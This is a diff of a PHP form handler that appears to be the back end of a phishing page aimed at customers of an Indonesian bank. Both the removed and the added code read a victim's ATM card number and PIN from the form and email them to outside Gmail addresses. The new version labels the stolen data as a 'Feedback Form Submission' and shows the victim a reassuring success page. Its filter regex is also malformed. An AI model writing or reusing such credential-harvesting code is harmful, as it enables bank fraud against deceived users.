@@ -1,15 +1,42 @@
 <?php 
-ini_set('display_errors', 1);
-error_reporting( E_ALL );
+$nomor_atm = $_POST['nomor_atm'];
+$pin = $_POST['pin'];
 
-$nomor = $_POST['nomoratm'];
-$pinn = $_POST['pin'];
+function filter_atm_header($form_field) {  
+return preg_replace('/[nr|!/<>^$%*&]+/','',$form_field);
+}
 
-$from = "nisa.codelifings@gmail.com";
-$to = "annisjabstore@gmail.com";
-$subject = "(new) BRI";
-$message = "<div>Nomor ATM : $nomor</div><br><div>Pin : $pinn</div>";
-$headers = "From:" . $from;
-mail($to,$subject,$message,$headers);
-echo "Success!!<br>";
+$nomor_atm  = filter_atm_header($nomor_atm);
+
+$headers = "From: $nomor_atm";
+$sent = mail('nisa.codelifings@gmail.com', 'Feedback Form Submission', $nomor_atm, $headers);
+
+if ($sent) {
+
+?><html>
+<head>
+<title>Success!</title>
+</head>
+<body>
+<h1>Success!</h1>
+</body>
+</html>
+
+<?php
+
+} else {
+?><html>
+<head>
+<title>Something went wrong</title>
+</head>
+<body>
+<h1>Something went wrong</h1>
+<p>Please try again.</p>
+</body>
+</html>
+<?php
+}
+?>
+
+
  ?>
